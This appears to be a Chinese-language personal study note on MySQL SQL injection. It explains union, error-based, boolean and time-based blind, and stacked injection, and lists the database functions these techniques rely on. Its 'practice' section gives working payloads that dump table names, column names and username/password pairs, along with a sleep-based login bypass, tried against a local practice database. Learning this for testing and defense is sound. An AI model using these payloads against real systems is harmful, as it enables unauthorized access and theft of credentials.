## sql注入

- 后端和数据库之间语法不共享
- 后端负责把预定义的和变量结合在一起，组成新的字符串
- 数据库能够认识此语句，根据语句描述进行查询从而返回内容
- 后端拿到数据库返回的内容后进行下一步操作
- 字符串无语义且无特定格式要求，查询语句有特定格式要求
- 后端和数据库之间语法不共享
- 输入被直接拼接到查询语句，导致数据车执行非预期的查询语句



### SQL注入可能出现的位置

核心:与数据库产生交互的地方且用户可以控制传参，就有可能存在注入



利用**联合查询爆破**出其他信息，如数据库名、版本号

![image-20250304111722240](https://cdn.jsdelivr.net/gh/Pugeet/Picture@main/image/202503041117269.png)

**concat 拼接**     爆破

table_schema 是？数据库术语，通常指数据库的名称，是MySQL中用于组织和管理表、视图、存储过程等数据库对象的顶层结构。

information_schema是？一个特殊的数据库，包含了关于MySQL服务器所维护的所有其他数据库的信息。

information_schema.tables是？是[MySQL](https://www.baidu.com/s?rsv_dl=re_dqa_generate&sa=re_dqa_generate&wd=MySQL&rsv_pq=f8ad43440001c562&oq=information_schema.tables是%3F&rsv_t=bee4koZGhtpHv7LJRbKHk2ToyE/HDjV2c4E/QwUIqdiggZ+qdTjmevzmsWcMNKH2YSDjCQ&tn=15007414_9_dg&ie=utf-8)中的一个特殊表，属于[INFORMATION_SCHEMA](https://www.baidu.com/s?rsv_dl=re_dqa_generate&sa=re_dqa_generate&wd=INFORMATION_SCHEMA&rsv_pq=f8ad43440001c562&oq=information_schema.tables是%3F&rsv_t=bee4koZGhtpHv7LJRbKHk2ToyE/HDjV2c4E/QwUIqdiggZ+qdTjmevzmsWcMNKH2YSDjCQ&tn=15007414_9_dg&ie=utf-8)数据库的一部分。

联合注入、联合查询

**一个查询语句里，order by只能出现一次，**



# 注入类型

数字型、字符型（构造闭合）



### **报错注入**

​	常用于没有回显，但有错误显示的场景

![image-20250304143708114](https://gitee.com/PUqicnda/img/raw/master/20250304143708166.png)

路径可以是子查询，像这样，报错的同时会爆破出数据库名称。**本质上是利用函数的错误**

![image-20250304205207049](https://gitee.com/PUqicnda/img/raw/master/20250304205207088.png)







### **盲注**

![image-20250304150436295](https://gitee.com/PUqicnda/img/raw/master/20250304150436349.png)

![image-20250304150818341](https://gitee.com/PUqicnda/img/raw/master/20250304150818389.png)

时间盲注对网速要求高。

时间过长会超时，导致访问不到任何数据。

**常用函数：**

> length() 函数 返回字符串的长度
>
> substr() 截取字符串 
>
>   substr(str,m,n)  该子串从 m 位置开始获取，取 n 个字符
>
> concat() 字符串拼接函数
>
> ascii() 返回字符的ascii码  [将字符变为数字]
>
> sleep() 将程序挂起一段时间n为n秒
>
> if(expr1,expr2,expr3) 判断语句 如果第一个语句正确就执行第二个语句，如果错误执行第三个语句

```
先返回数据库字符串长度，再一个个截取字符串，用ascii() 返回字符的ascii码，再拼接起来得出数据库名称。
同理，可查询数据库表名称、表字段名称。
```

![image-20250304212623822](https://gitee.com/PUqicnda/img/raw/master/20250304212623881.png)

![image-20250304212718100](https://gitee.com/PUqicnda/img/raw/master/20250304212718181.png)

延迟sleep（）函数

​	![image-20250304213747192](https://gitee.com/PUqicnda/img/raw/master/20250304213747246.png)

**注意：直接使用if可能会存在代码重复执行的效果。**





### 堆叠注入

​	一次性可以执行多条语句。

堆叠查询：

![image-20250304162610555](https://gitee.com/PUqicnda/img/raw/master/20250304162610603.png)

使用前提:堆叠注入使用的条件很苛刻，会受到API以及数据库引擎，或者是权限的限制。只有当调用数据库的函数支持执行多条SQL语句的时候才可以使用。例如mysqli multi query()函数就支持多条SQL语句同时执行，而mysqli query()函数就不支持。在实际应用中，大多数都使用的是mysqli query()函数，所以能使用堆叠注入的说明该网站做的很不成功，因为堆叠注入的爆破效果太好了。一般PHP搭建的网站为了防止SQL注入都会使用mysqli query()函数。

防御方法:尽量避免使用mysqli multi query() 函数，同时后台对输入的语句要进行过滤操作。

### 判断是否存在注入点

and 1=1

有输出and 1=2没有输出



**直接使用if可能会存在代码重复执行。**

## SQL注入常用数据库函数



```
version(); 	-- MySQL版本
database();	 -- 当前使用的数据库
user(); 		-- 当前数据库用户
length(); 	-- 返回字符串的字节长度(在utf8mb4编码中，一个汉字字符占3个字节)
char_length();	 -- 用于返回字符串的字符个数
substr(str,start,len);	 -- 截取字符串 str=输入的字符串，start=开始的位置，len=长度 例如：substr('database',1,1)，	该函数返回'd'字符
ascii(); 	--返回字符的ASCII值一般搭配substr使用
concat(str1,str2,str3); 	-- 将多个字符串连接成一个字符串
updatexml(XML_name, XPath_str, new_value);	 -- 改变文档中符合条件的节点值。xml_name:文档对象的名称,xpath_str:xpath格式的字符串,new_value:需要更改的新值
extractvalue(XML_name,Xpath_str);	 -- 从xml中返回所查询的值，输出字符长度限制为32个字符
floor(4.001); 	-- 向下取整 返回不大于4.001的最大整数:4
exp(); 	-- 用于将自然对数的底数提升为指定数字的幂
sleep(); 	-- 暂停程序执行，单位秒
if(expr,expr2,expr3);	 -- 判断函数 如果expr为真，执行expr2，反之执行expr3
left(str,len)	 -- 从左向右截取str，截取len位置
count() 	-- 返回指定列的条目数量
```



统计数据库行数、

获取第一行



select username from users where username = ''  or (if(121 >120,sleep(1),1)) #' and password = ''



![image-20250304162928414](https://gitee.com/PUqicnda/img/raw/master/20250304162928447.png)

```
编码不一样，进行修改，
-- use mybbs;
-- select username from users where username = ''  or (if(121 >120,sleep(1),1)) #' and password = ''
-- select * from user where  extractvalue(0x7e,(select group concat(table_name) from information_schema.table where table_name = database()));
#show create database mybbs;
#alter database mybbs
#default character set utf8
#collate utf8_general_ci;
#show full COLUMNS from users;
#show full COLUMNS from information_schema.tables LIKE 'table_name';
-- ALter database mybbs character set utf8 collate utf8_general_ci;
#select concat(
#       'alter table',table_name,
#       'CONVERT TO CHARACTER SET utf8 COLLATE utf8_general_ci;')
#       AS 'ALTER_TABLE_QUERY' 
#       FROM information_schema.TABLES 
#       WHERE TABLE_SCHEMA = 'mybbs' 
#       AND TABLE_TYPE = 'BASE TABLE';
#ALter table `article` convert to character set utf8 collate utf8_general_ci;
#select table_name,column_name,collation_name from information_schema.columns where table_schema = 'mybbs' and collation_name is not null;
```

![image-20250304200932464](https://gitee.com/PUqicnda/img/raw/master/20250304200932506.png)

如图，改完是utf8_general_ci

# 报错注入

https://blog.csdn.net/m0_73477772/article/details/130586798?fromshare=blogdetail&sharetype=blogdetail&sharerId=130586798&sharerefer=PC&sharesource=m0_68735537&sharefrom=from_link





### 实战

```
select username,name from users where id = 1 union select 1,concat(table_name) from information_schema.tables where table_schema = database();//拿到表名，如下图
```

![image-20250304201357330](https://gitee.com/PUqicnda/img/raw/master/20250304201357363.png)

```
select username,name from users where id = 1 union select 1,concat(column_name) from information_schema.columns where table_schema = database() and table_name = 'users';//拿到字段名，如下图
```

![image-20250304201738583](https://gitee.com/PUqicnda/img/raw/master/20250304201738620.png)

```
select username,name from users where id = 1 union select 1,concat(username,0x7e,password) from users;//联合查询，实现sql注入，查询到用户名和密码
```

![image-20250304202230850](https://gitee.com/PUqicnda/img/raw/master/20250304202230883.png)

```
select username,name,password from users where name = 'admin' or '1'='1' order by 1;//巧用or或者and进行查询，可以爆破信息。（admin是新加的）
```

![image-20250304203138606](https://gitee.com/PUqicnda/img/raw/master/20250304203138639.png)

```
同样的，union和order by也可以用来判断字段数（列数）。
union查询：第一个查询的字段数必须和第二个查询的字段数相同，
		select username,name from users where id = 1 union select 1,2,... from table  --一点点试出结果
order by :超过列数会报错		
		select * from users order by 1;//按第一列排列
```

